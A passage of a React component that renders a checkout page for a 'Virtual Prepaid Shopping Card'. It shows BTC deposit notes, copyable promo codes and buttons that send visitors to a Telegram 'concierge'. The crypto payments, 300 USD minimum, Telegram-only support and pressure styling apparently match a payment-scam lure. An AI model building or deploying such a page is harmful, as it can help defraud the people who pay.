                  2. <strong className="text-white">BTC Addresses:</strong> Binance supports deposits from all BTC addresses (starting with "1", "3", "bc1p" and "bc1q").
                </p>
                <p className="text-[10px] text-amber-300 font-bold leading-snug">
                  ⚠️ Please do not send validator rewards to your Binance deposit address, as they will not be credited and funds may be lost.
                </p>
              </div>
            </div>

            {/* Included Store Promo Codes & Discount Vouchers */}
            <div className="space-y-1.5">
              <span className="text-[11px] font-bold text-pink-300 flex items-center gap-1">
                <Tag className="w-3.5 h-3.5 text-yellow-400" /> Included Store Promo Codes & Discounts:
              </span>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                {STORE_DISCOUNTS.map((item, idx) => (
                  <div 
                    key={idx}
                    className="bg-black/70 border border-purple-500/20 p-2 rounded-xl flex items-center justify-between text-xs hover:border-pink-500/40 transition-colors"
                  >
                    <div>
                      <div className="font-bold text-white text-[11px]">{item.store}</div>
                      <div className="text-[10px] text-emerald-400 font-bold">{item.discount} • {item.tag}</div>
                    </div>
                    <button
                      onClick={() => handleCopy(item.code, `code-${idx}`)}
                      className="px-2 py-1 bg-purple-950/80 hover:bg-purple-900 border border-purple-500/30 rounded-lg text-[10px] font-mono text-pink-300 flex items-center gap-1 font-bold"
                      title="Copy promo code"
                    >
                      {copiedField === `code-${idx}` ? (
                        <>
                          <Check className="w-3 h-3 text-emerald-400" />
                          <span>Copied</span>
                        </>
                      ) : (
                        <>
                          <span>{item.code}</span>
                          <Copy className="w-3 h-3 text-zinc-400" />
                        </>
                      )}
                    </button>
                  </div>
                ))}
              </div>
            </div>

          </div>

          {/* Primary Action Button: Claim Shopping Voucher on Telegram */}
          <div className="space-y-2 pt-2 border-t border-purple-500/20">
            <button
              onClick={handleClaimTelegram}
              className="w-full py-3.5 bg-gradient-to-r from-pink-500 via-purple-600 to-indigo-600 hover:from-pink-400 hover:to-indigo-500 text-white font-black text-xs sm:text-sm rounded-xl border border-pink-300 shadow-[0_0_20px_rgba(217,70,239,0.6)] flex items-center justify-center gap-2 transition-transform hover:scale-[1.02] active:scale-[0.98] pulse-cta"
            >
              <ShoppingBag className="w-4 h-4 text-yellow-300 fill-yellow-300" />
              <span>Issue {formatUSD(voucherAmount)} Card (Zero Processing Fee)</span>
              <Send className="w-4 h-4 text-white" />
            </button>

            {/* 24/7 Concierge Support */}
            <button
              onClick={() => {
                incrementClicks();
                onOpenTelegram('Hi @adkingsSupport, I have a question about the Virtual Prepaid Shopping Card (Min 300 USD).');
              }}
              className="w-full py-1.5 bg-zinc-900/90 hover:bg-zinc-800 text-pink-300 font-bold text-[10px] rounded-lg border border-purple-500/30 flex items-center justify-center gap-1 transition-colors"
            >
              <span>Contact 24/7 Virtual Card Concierge on Telegram</span>
            </button>

            {/* Security Notice */}
            <div className="text-[10px] text-zinc-400 flex items-start gap-1.5 bg-black/40 p-2 rounded-lg border border-purple-500/20">
              <ShieldCheck className="w-3.5 h-3.5 text-emerald-400 shrink-0 mt-0.5" />
              <span>
                Prepaid virtual cards are issued instantly with 3D Secure verification for global e-commerce checkouts. Direct concierge support available 24/7 on Telegram.
              </span>
            </div>
          </div>

        </div>

      </div>

    </div>
  );
};
